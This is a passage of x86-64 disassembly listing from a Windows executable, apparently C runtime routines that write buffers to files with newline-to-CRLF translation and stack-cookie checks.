   14000ab03:	46 0f be bc 39 d0 78 	movsbl 0x178d0(%rcx,%r15,1),%r15d
   14000ab0a:	01 00 
   14000ab0c:	41 ff c7             	inc    %r15d
   14000ab0f:	45 8b ef             	mov    %r15d,%r13d
   14000ab12:	44 2b ea             	sub    %edx,%r13d
   14000ab15:	4d 63 d5             	movslq %r13d,%r10
   14000ab18:	4d 3b d0             	cmp    %r8,%r10
   14000ab1b:	0f 8f 78 02 00 00    	jg     0x14000ad99
   14000ab21:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000ab25:	49 8b d3             	mov    %r11,%rdx
   14000ab28:	4c 2b c8             	sub    %rax,%r9
   14000ab2b:	4f 8d 04 f1          	lea    (%r9,%r14,8),%r8
   14000ab2f:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000ab33:	48 03 ca             	add    %rdx,%rcx
   14000ab36:	48 ff c2             	inc    %rdx
   14000ab39:	42 8a 44 01 3e       	mov    0x3e(%rcx,%r8,1),%al
   14000ab3e:	88 01                	mov    %al,(%rcx)
   14000ab40:	48 3b d6             	cmp    %rsi,%rdx
   14000ab43:	7c ea                	jl     0x14000ab2f
   14000ab45:	45 85 ed             	test   %r13d,%r13d
   14000ab48:	7e 15                	jle    0x14000ab5f
   14000ab4a:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000ab4e:	4d 8b c2             	mov    %r10,%r8
   14000ab51:	48 03 ce             	add    %rsi,%rcx
   14000ab54:	48 8b d7             	mov    %rdi,%rdx
   14000ab57:	e8 34 86 ff ff       	call   0x140003190
   14000ab5c:	45 33 db             	xor    %r11d,%r11d
   14000ab5f:	49 8b d3             	mov    %r11,%rdx
   14000ab62:	4c 8d 05 97 54 ff ff 	lea    -0xab69(%rip),%r8        # 0x140000000
   14000ab69:	4b 8b 8c e0 50 80 01 	mov    0x18050(%r8,%r12,8),%rcx
   14000ab70:	00 
   14000ab71:	48 03 ca             	add    %rdx,%rcx
   14000ab74:	48 ff c2             	inc    %rdx
   14000ab77:	46 88 5c f1 3e       	mov    %r11b,0x3e(%rcx,%r14,8)
   14000ab7c:	48 3b d6             	cmp    %rsi,%rdx
   14000ab7f:	7c e8                	jl     0x14000ab69
   14000ab81:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000ab85:	4c 89 5d bf          	mov    %r11,-0x41(%rbp)
   14000ab89:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   14000ab8d:	4c 8d 4d bf          	lea    -0x41(%rbp),%r9
   14000ab91:	41 8b c3             	mov    %r11d,%eax
   14000ab94:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000ab98:	41 83 ff 04          	cmp    $0x4,%r15d
   14000ab9c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000aba1:	0f 94 c0             	sete   %al
   14000aba4:	ff c0                	inc    %eax
   14000aba6:	44 8b c0             	mov    %eax,%r8d
   14000aba9:	44 8b f8             	mov    %eax,%r15d
   14000abac:	e8 57 0c 00 00       	call   0x14000b808
   14000abb1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000abb5:	0f 84 d7 00 00 00    	je     0x14000ac92
   14000abbb:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   14000abbf:	4c 8b 6d af          	mov    -0x51(%rbp),%r13
   14000abc3:	48 63 f0             	movslq %eax,%rsi
   14000abc6:	48 03 f7             	add    %rdi,%rsi
   14000abc9:	e9 e6 00 00 00       	jmp    0x14000acb4
   14000abce:	0f b6 07             	movzbl (%rdi),%eax
   14000abd1:	49 8b d5             	mov    %r13,%rdx
   14000abd4:	48 2b d7             	sub    %rdi,%rdx
   14000abd7:	4a 0f be b4 38 d0 78 	movsbq 0x178d0(%rax,%r15,1),%rsi
   14000abde:	01 00 
   14000abe0:	8d 4e 01             	lea    0x1(%rsi),%ecx
   14000abe3:	48 63 c1             	movslq %ecx,%rax
   14000abe6:	48 3b c2             	cmp    %rdx,%rax
   14000abe9:	0f 8f e4 01 00 00    	jg     0x14000add3
   14000abef:	83 f9 04             	cmp    $0x4,%ecx
   14000abf2:	4c 89 5d cf          	mov    %r11,-0x31(%rbp)
   14000abf6:	41 8b c3             	mov    %r11d,%eax
   14000abf9:	48 89 7d d7          	mov    %rdi,-0x29(%rbp)
   14000abfd:	0f 94 c0             	sete   %al
   14000ac00:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   14000ac04:	ff c0                	inc    %eax
   14000ac06:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000ac0a:	44 8b c0             	mov    %eax,%r8d
   14000ac0d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000ac12:	8b d8                	mov    %eax,%ebx
   14000ac14:	e8 ef 0b 00 00       	call   0x14000b808
   14000ac19:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000ac1d:	74 73                	je     0x14000ac92
   14000ac1f:	48 03 f7             	add    %rdi,%rsi
   14000ac22:	44 8b fb             	mov    %ebx,%r15d
   14000ac25:	e9 8a 00 00 00       	jmp    0x14000acb4
   14000ac2a:	48 8d 05 cf 53 ff ff 	lea    -0xac31(%rip),%rax        # 0x140000000
   14000ac31:	4a 8b 94 e0 50 80 01 	mov    0x18050(%rax,%r12,8),%rdx
   14000ac38:	00 
   14000ac39:	42 8a 4c f2 3d       	mov    0x3d(%rdx,%r14,8),%cl
   14000ac3e:	f6 c1 04             	test   $0x4,%cl
   14000ac41:	74 1b                	je     0x14000ac5e
   14000ac43:	42 8a 44 f2 3e       	mov    0x3e(%rdx,%r14,8),%al
   14000ac48:	80 e1 fb             	and    $0xfb,%cl
   14000ac4b:	88 45 07             	mov    %al,0x7(%rbp)
   14000ac4e:	8a 07                	mov    (%rdi),%al
   14000ac50:	42 88 4c f2 3d       	mov    %cl,0x3d(%rdx,%r14,8)
   14000ac55:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   14000ac59:	88 45 08             	mov    %al,0x8(%rbp)
   14000ac5c:	eb 1f                	jmp    0x14000ac7d
   14000ac5e:	e8 bd d2 ff ff       	call   0x140007f20
   14000ac63:	0f b6 0f             	movzbl (%rdi),%ecx
   14000ac66:	33 d2                	xor    %edx,%edx
   14000ac68:	66 39 14 48          	cmp    %dx,(%rax,%rcx,2)
   14000ac6c:	7d 2d                	jge    0x14000ac9b
   14000ac6e:	48 ff c6             	inc    %rsi
   14000ac71:	49 3b f5             	cmp    %r13,%rsi
   14000ac74:	0f 83 b2 01 00 00    	jae    0x14000ae2c
   14000ac7a:	48 8b d7             	mov    %rdi,%rdx
   14000ac7d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000ac83:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000ac88:	e8 df e9 ff ff       	call   0x14000966c
   14000ac8d:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000ac90:	75 22                	jne    0x14000acb4
   14000ac92:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   14000ac96:	e9 8b 01 00 00       	jmp    0x14000ae26
   14000ac9b:	4d 8b c7             	mov    %r15,%r8
   14000ac9e:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000aca3:	48 8b d7             	mov    %rdi,%rdx
   14000aca6:	e8 c1 e9 ff ff       	call   0x14000966c
   14000acab:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000acae:	0f 84 af 01 00 00    	je     0x14000ae63
   14000acb4:	8b 4d a7             	mov    -0x59(%rbp),%ecx
   14000acb7:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   14000acbb:	33 db                	xor    %ebx,%ebx
   14000acbd:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000acc2:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000acc7:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   14000accb:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000acd0:	45 8b cf             	mov    %r15d,%r9d
   14000acd3:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000acda:	00 
   14000acdb:	33 d2                	xor    %edx,%edx
   14000acdd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ace2:	e8 f1 c2 ff ff       	call   0x140006fd8
   14000ace7:	8b f0                	mov    %eax,%esi
   14000ace9:	85 c0                	test   %eax,%eax
   14000aceb:	0f 84 d2 01 00 00    	je     0x14000aec3
   14000acf1:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   14000acf5:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000acfa:	44 8b c0             	mov    %eax,%r8d
   14000acfd:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000ad02:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000ad06:	ff 15 f4 33 00 00    	call   *0x33f4(%rip)        # 0x14000e100
   14000ad0c:	45 33 db             	xor    %r11d,%r11d
   14000ad0f:	85 c0                	test   %eax,%eax
   14000ad11:	0f 84 a3 01 00 00    	je     0x14000aeba
   14000ad17:	44 8b 7c 24 40       	mov    0x40(%rsp),%r15d
   14000ad1c:	8b df                	mov    %edi,%ebx
   14000ad1e:	2b 5d df             	sub    -0x21(%rbp),%ebx
   14000ad21:	41 03 df             	add    %r15d,%ebx
   14000ad24:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000ad27:	39 74 24 4c          	cmp    %esi,0x4c(%rsp)
   14000ad2b:	0f 82 f1 00 00 00    	jb     0x14000ae22
   14000ad31:	80 7c 24 44 0a       	cmpb   $0xa,0x44(%rsp)
   14000ad36:	75 49                	jne    0x14000ad81
   14000ad38:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   14000ad3c:	41 8d 43 0d          	lea    0xd(%r11),%eax
   14000ad40:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000ad45:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   14000ad4a:	45 8d 43 01          	lea    0x1(%r11),%r8d
   14000ad4e:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   14000ad53:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   14000ad58:	ff 15 a2 33 00 00    	call   *0x33a2(%rip)        # 0x14000e100
   14000ad5e:	45 33 db             	xor    %r11d,%r11d
   14000ad61:	85 c0                	test   %eax,%eax
   14000ad63:	0f 84 f1 00 00 00    	je     0x14000ae5a
   14000ad69:	83 7c 24 4c 01       	cmpl   $0x1,0x4c(%rsp)
   14000ad6e:	0f 82 ae 00 00 00    	jb     0x14000ae22
   14000ad74:	41 ff c7             	inc    %r15d
   14000ad77:	ff c3                	inc    %ebx
   14000ad79:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   14000ad7e:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000ad81:	48 8b f7             	mov    %rdi,%rsi
   14000ad84:	49 3b fd             	cmp    %r13,%rdi
   14000ad87:	0f 83 e0 00 00 00    	jae    0x14000ae6d
   14000ad8d:	48 8b 45 e7          	mov    -0x19(%rbp),%rax
   14000ad91:	8b 55 ab             	mov    -0x55(%rbp),%edx
   14000ad94:	e9 04 fd ff ff       	jmp    0x14000aa9d
   14000ad99:	41 8b d3             	mov    %r11d,%edx
   14000ad9c:	4d 85 c0             	test   %r8,%r8
   14000ad9f:	7e 2d                	jle    0x14000adce
   14000ada1:	48 2b fe             	sub    %rsi,%rdi
   14000ada4:	48 8d 1d 55 52 ff ff 	lea    -0xadab(%rip),%rbx        # 0x140000000
   14000adab:	8a 04 37             	mov    (%rdi,%rsi,1),%al
   14000adae:	ff c2                	inc    %edx
   14000adb0:	4a 8b 8c e3 50 80 01 	mov    0x18050(%rbx,%r12,8),%rcx
   14000adb7:	00 
   14000adb8:	48 03 ce             	add    %rsi,%rcx
   14000adbb:	48 ff c6             	inc    %rsi
   14000adbe:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   14000adc3:	48 63 c2             	movslq %edx,%rax
   14000adc6:	49 3b c0             	cmp    %r8,%rax
   14000adc9:	7c e0                	jl     0x14000adab
   14000adcb:	8b 5d 9b             	mov    -0x65(%rbp),%ebx
   14000adce:	41 03 d8             	add    %r8d,%ebx
   14000add1:	eb 4c                	jmp    0x14000ae1f
   14000add3:	45 8b cb             	mov    %r11d,%r9d
   14000add6:	48 85 d2             	test   %rdx,%rdx
   14000add9:	7e 42                	jle    0x14000ae1d
   14000addb:	4c 8b 6d ef          	mov    -0x11(%rbp),%r13
   14000addf:	4d 8b c3             	mov    %r11,%r8
   14000ade2:	4d 8b d5             	mov    %r13,%r10
   14000ade5:	41 83 e5 3f          	and    $0x3f,%r13d
   14000ade9:	49 c1 fa 06          	sar    $0x6,%r10
   14000aded:	4e 8d 1c ed 00 00 00 	lea    0x0(,%r13,8),%r11
   14000adf4:	00 
   14000adf5:	4d 03 dd             	add    %r13,%r11
   14000adf8:	41 8a 04 38          	mov    (%r8,%rdi,1),%al
   14000adfc:	41 ff c1             	inc    %r9d
   14000adff:	4b 8b 8c d7 50 80 01 	mov    0x18050(%r15,%r10,8),%rcx
   14000ae06:	00 
   14000ae07:	49 03 c8             	add    %r8,%rcx
   14000ae0a:	49 ff c0             	inc    %r8
   14000ae0d:	42 88 44 d9 3e       	mov    %al,0x3e(%rcx,%r11,8)
   14000ae12:	49 63 c1             	movslq %r9d,%rax
   14000ae15:	48 3b c2             	cmp    %rdx,%rax
   14000ae18:	7c de                	jl     0x14000adf8
   14000ae1a:	45 33 db             	xor    %r11d,%r11d
   14000ae1d:	03 da                	add    %edx,%ebx
   14000ae1f:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000ae22:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   14000ae26:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000ae2a:	eb 49                	jmp    0x14000ae75
   14000ae2c:	8a 07                	mov    (%rdi),%al
   14000ae2e:	4c 8d 05 cb 51 ff ff 	lea    -0xae35(%rip),%r8        # 0x140000000
   14000ae35:	4b 8b 8c e0 50 80 01 	mov    0x18050(%r8,%r12,8),%rcx
   14000ae3c:	00 
   14000ae3d:	ff c3                	inc    %ebx
   14000ae3f:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000ae42:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   14000ae47:	4b 8b 84 e0 50 80 01 	mov    0x18050(%r8,%r12,8),%rax
   14000ae4e:	00 
   14000ae4f:	42 80 4c f0 3d 04    	orb    $0x4,0x3d(%rax,%r14,8)
   14000ae55:	38 55 8f             	cmp    %dl,-0x71(%rbp)
   14000ae58:	eb cc                	jmp    0x14000ae26
   14000ae5a:	ff 15 30 32 00 00    	call   *0x3230(%rip)        # 0x14000e090
   14000ae60:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000ae63:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000ae67:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   14000ae6b:	eb 08                	jmp    0x14000ae75
   14000ae6d:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000ae71:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   14000ae75:	74 0c                	je     0x14000ae83
   14000ae77:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000ae7c:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000ae83:	48 8b 45 f7          	mov    -0x9(%rbp),%rax
   14000ae87:	f2 0f 10 45 97       	movsd  -0x69(%rbp),%xmm0
   14000ae8c:	f2 0f 11 00          	movsd  %xmm0,(%rax)
   14000ae90:	89 48 08             	mov    %ecx,0x8(%rax)
   14000ae93:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000ae97:	48 33 cc             	xor    %rsp,%rcx
   14000ae9a:	e8 51 25 00 00       	call   0x14000d3f0
   14000ae9f:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   14000aea6:	00 
   14000aea7:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   14000aeae:	41 5f                	pop    %r15
   14000aeb0:	41 5e                	pop    %r14
   14000aeb2:	41 5d                	pop    %r13
   14000aeb4:	41 5c                	pop    %r12
   14000aeb6:	5f                   	pop    %rdi
   14000aeb7:	5e                   	pop    %rsi
   14000aeb8:	5d                   	pop    %rbp
   14000aeb9:	c3                   	ret
   14000aeba:	ff 15 d0 31 00 00    	call   *0x31d0(%rip)        # 0x14000e090
   14000aec0:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000aec3:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000aec7:	38 5d 8f             	cmp    %bl,-0x71(%rbp)
   14000aeca:	eb a9                	jmp    0x14000ae75
   14000aecc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000aed1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000aed6:	56                   	push   %rsi
   14000aed7:	57                   	push   %rdi
   14000aed8:	41 56                	push   %r14
   14000aeda:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000aedf:	e8 ac 28 00 00       	call   0x14000d790
   14000aee4:	48 2b e0             	sub    %rax,%rsp
   14000aee7:	48 8b 05 3a c1 00 00 	mov    0xc13a(%rip),%rax        # 0x140017028
   14000aeee:	48 33 c4             	xor    %rsp,%rax
   14000aef1:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000aef8:	00 
   14000aef9:	4c 63 d2             	movslq %edx,%r10
   14000aefc:	48 8b f9             	mov    %rcx,%rdi
   14000aeff:	49 8b c2             	mov    %r10,%rax
   14000af02:	41 8b e9             	mov    %r9d,%ebp
   14000af05:	48 c1 f8 06          	sar    $0x6,%rax
   14000af09:	48 8d 0d 40 d1 00 00 	lea    0xd140(%rip),%rcx        # 0x140018050
   14000af10:	41 83 e2 3f          	and    $0x3f,%r10d
   14000af14:	49 03 e8             	add    %r8,%rbp
   14000af17:	49 8b f0             	mov    %r8,%rsi
   14000af1a:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000af1e:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000af22:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000af27:	33 c0                	xor    %eax,%eax
   14000af29:	48 89 07             	mov    %rax,(%rdi)
   14000af2c:	89 47 08             	mov    %eax,0x8(%rdi)
   14000af2f:	4c 3b c5             	cmp    %rbp,%r8
   14000af32:	73 6f                	jae    0x14000afa3
   14000af34:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000af39:	48 3b f5             	cmp    %rbp,%rsi
   14000af3c:	73 24                	jae    0x14000af62
   14000af3e:	8a 06                	mov    (%rsi),%al
   14000af40:	48 ff c6             	inc    %rsi
   14000af43:	3c 0a                	cmp    $0xa,%al
   14000af45:	75 09                	jne    0x14000af50
   14000af47:	ff 47 08             	incl   0x8(%rdi)
   14000af4a:	c6 03 0d             	movb   $0xd,(%rbx)
   14000af4d:	48 ff c3             	inc    %rbx
   14000af50:	88 03                	mov    %al,(%rbx)
   14000af52:	48 ff c3             	inc    %rbx
   14000af55:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000af5c:	00 
   14000af5d:	48 3b d8             	cmp    %rax,%rbx
   14000af60:	72 d7                	jb     0x14000af39
   14000af62:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000af68:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000af6d:	2b d8                	sub    %eax,%ebx
   14000af6f:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000af74:	44 8b c3             	mov    %ebx,%r8d
   14000af77:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000af7c:	49 8b ce             	mov    %r14,%rcx
   14000af7f:	ff 15 7b 31 00 00    	call   *0x317b(%rip)        # 0x14000e100
   14000af85:	85 c0                	test   %eax,%eax
   14000af87:	74 12                	je     0x14000af9b
   14000af89:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000af8d:	01 47 04             	add    %eax,0x4(%rdi)
   14000af90:	3b c3                	cmp    %ebx,%eax
   14000af92:	72 0f                	jb     0x14000afa3
   14000af94:	48 3b f5             	cmp    %rbp,%rsi
   14000af97:	72 9b                	jb     0x14000af34
   14000af99:	eb 08                	jmp    0x14000afa3
   14000af9b:	ff 15 ef 30 00 00    	call   *0x30ef(%rip)        # 0x14000e090
   14000afa1:	89 07                	mov    %eax,(%rdi)
   14000afa3:	48 8b c7             	mov    %rdi,%rax
   14000afa6:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000afad:	00 
   14000afae:	48 33 cc             	xor    %rsp,%rcx
   14000afb1:	e8 3a 24 00 00       	call   0x14000d3f0
   14000afb6:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000afbd:	00 
   14000afbe:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000afc2:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000afc6:	49 8b e3             	mov    %r11,%rsp
   14000afc9:	41 5e                	pop    %r14
   14000afcb:	5f                   	pop    %rdi
   14000afcc:	5e                   	pop    %rsi
   14000afcd:	c3                   	ret
   14000afce:	cc                   	int3
   14000afcf:	cc                   	int3
   14000afd0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000afd5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000afda:	56                   	push   %rsi
   14000afdb:	57                   	push   %rdi
   14000afdc:	41 56                	push   %r14
   14000afde:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000afe3:	e8 a8 27 00 00       	call   0x14000d790
   14000afe8:	48 2b e0             	sub    %rax,%rsp
   14000afeb:	48 8b 05 36 c0 00 00 	mov    0xc036(%rip),%rax        # 0x140017028
   14000aff2:	48 33 c4             	xor    %rsp,%rax
   14000aff5:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000affc:	00 
   14000affd:	4c 63 d2             	movslq %edx,%r10
   14000b000:	48 8b f9             	mov    %rcx,%rdi
   14000b003:	49 8b c2             	mov    %r10,%rax
   14000b006:	41 8b e9             	mov    %r9d,%ebp
   14000b009:	48 c1 f8 06          	sar    $0x6,%rax
   14000b00d:	48 8d 0d 3c d0 00 00 	lea    0xd03c(%rip),%rcx        # 0x140018050
   14000b014:	41 83 e2 3f          	and    $0x3f,%r10d
   14000b018:	49 03 e8             	add    %r8,%rbp
   14000b01b:	49 8b f0             	mov    %r8,%rsi
   14000b01e:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000b022:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000b026:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000b02b:	33 c0                	xor    %eax,%eax
   14000b02d:	48 89 07             	mov    %rax,(%rdi)
   14000b030:	89 47 08             	mov    %eax,0x8(%rdi)
   14000b033:	4c 3b c5             	cmp    %rbp,%r8
   14000b036:	0f 83 82 00 00 00    	jae    0x14000b0be
   14000b03c:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000b041:	48 3b f5             	cmp    %rbp,%rsi
   14000b044:	73 31                	jae    0x14000b077
   14000b046:	0f b7 06             	movzwl (%rsi),%eax
   14000b049:	48 83 c6 02          	add    $0x2,%rsi
   14000b04d:	66 83 f8 0a          	cmp    $0xa,%ax
   14000b051:	75 10                	jne    0x14000b063
   14000b053:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000b057:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000b05c:	66 89 0b             	mov    %cx,(%rbx)
   14000b05f:	48 83 c3 02          	add    $0x2,%rbx
   14000b063:	66 89 03             	mov    %ax,(%rbx)
   14000b066:	48 83 c3 02          	add    $0x2,%rbx
   14000b06a:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000b071:	00 
   14000b072:	48 3b d8             	cmp    %rax,%rbx
   14000b075:	72 ca                	jb     0x14000b041
   14000b077:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000b07d:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000b082:	48 2b d8             	sub    %rax,%rbx
   14000b085:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000b08a:	48 d1 fb             	sar    $1,%rbx
   14000b08d:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000b092:	03 db                	add    %ebx,%ebx
   14000b094:	49 8b ce             	mov    %r14,%rcx
   14000b097:	44 8b c3             	mov    %ebx,%r8d
   14000b09a:	ff 15 60 30 00 00    	call   *0x3060(%rip)        # 0x14000e100
   14000b0a0:	85 c0                	test   %eax,%eax
   14000b0a2:	74 12                	je     0x14000b0b6
   14000b0a4:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000b0a8:	01 47 04             	add    %eax,0x4(%rdi)
   14000b0ab:	3b c3                	cmp    %ebx,%eax
   14000b0ad:	72 0f                	jb     0x14000b0be
   14000b0af:	48 3b f5             	cmp    %rbp,%rsi
   14000b0b2:	72 88                	jb     0x14000b03c
   14000b0b4:	eb 08                	jmp    0x14000b0be
   14000b0b6:	ff 15 d4 2f 00 00    	call   *0x2fd4(%rip)        # 0x14000e090
   14000b0bc:	89 07                	mov    %eax,(%rdi)
   14000b0be:	48 8b c7             	mov    %rdi,%rax
   14000b0c1:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000b0c8:	00 
   14000b0c9:	48 33 cc             	xor    %rsp,%rcx
   14000b0cc:	e8 1f 23 00 00       	call   0x14000d3f0
   14000b0d1:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000b0d8:	00 
   14000b0d9:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000b0dd:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000b0e1:	49 8b e3             	mov    %r11,%rsp
   14000b0e4:	41 5e                	pop    %r14
   14000b0e6:	5f                   	pop    %rdi
   14000b0e7:	5e                   	pop    %rsi
   14000b0e8:	c3                   	ret
   14000b0e9:	cc                   	int3
   14000b0ea:	cc                   	int3
   14000b0eb:	cc                   	int3
   14000b0ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b0f1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000b0f6:	56                   	push   %rsi
   14000b0f7:	57                   	push   %rdi
   14000b0f8:	41 54                	push   %r12
   14000b0fa:	41 56                	push   %r14
   14000b0fc:	41 57                	push   %r15
   14000b0fe:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000b103:	e8 88 26 00 00       	call   0x14000d790
   14000b108:	48 2b e0             	sub    %rax,%rsp
   14000b10b:	48 8b 05 16 bf 00 00 	mov    0xbf16(%rip),%rax        # 0x140017028
   14000b112:	48 33 c4             	xor    %rsp,%rax
   14000b115:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000b11c:	00 
   14000b11d:	4c 63 d2             	movslq %edx,%r10
   14000b120:	48 8b d9             	mov    %rcx,%rbx
   14000b123:	49 8b c2             	mov    %r10,%rax
   14000b126:	45 8b f1             	mov    %r9d,%r14d
   14000b129:	48 c1 f8 06          	sar    $0x6,%rax
   14000b12d:	48 8d 0d 1c cf 00 00 	lea    0xcf1c(%rip),%rcx        # 0x140018050
   14000b134:	41 83 e2 3f          	and    $0x3f,%r10d
   14000b138:	4d 03 f0             	add    %r8,%r14
   14000b13b:	4d 8b f8             	mov    %r8,%r15
   14000b13e:	49 8b f8             	mov    %r8,%rdi
   14000b141:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000b145:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000b149:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000b14e:	33 c0                	xor    %eax,%eax
   14000b150:	48 89 03             	mov    %rax,(%rbx)
   14000b153:	4d 3b c6             	cmp    %r14,%r8
   14000b156:	89 43 08             	mov    %eax,0x8(%rbx)
   14000b159:	0f 83 ce 00 00 00    	jae    0x14000b22d
   14000b15f:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000b164:	49 3b fe             	cmp    %r14,%rdi
   14000b167:	73 2d                	jae    0x14000b196
   14000b169:	0f b7 0f             	movzwl (%rdi),%ecx
   14000b16c:	48 83 c7 02          	add    $0x2,%rdi
   14000b170:	66 83 f9 0a          	cmp    $0xa,%cx
   14000b174:	75 0c                	jne    0x14000b182
   14000b176:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000b17b:	66 89 10             	mov    %dx,(%rax)
   14000b17e:	48 83 c0 02          	add    $0x2,%rax
   14000b182:	66 89 08             	mov    %cx,(%rax)
   14000b185:	48 83 c0 02          	add    $0x2,%rax
   14000b189:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   14000b190:	00 
   14000b191:	48 3b c1             	cmp    %rcx,%rax
   14000b194:	72 ce                	jb     0x14000b164
   14000b196:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000b19c:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000b1a1:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000b1a7:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000b1ac:	48 2b c1             	sub    %rcx,%rax
   14000b1af:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000b1b6:	00 
   14000b1b7:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000b1be:	00 
   14000b1bf:	48 d1 f8             	sar    $1,%rax
   14000b1c2:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
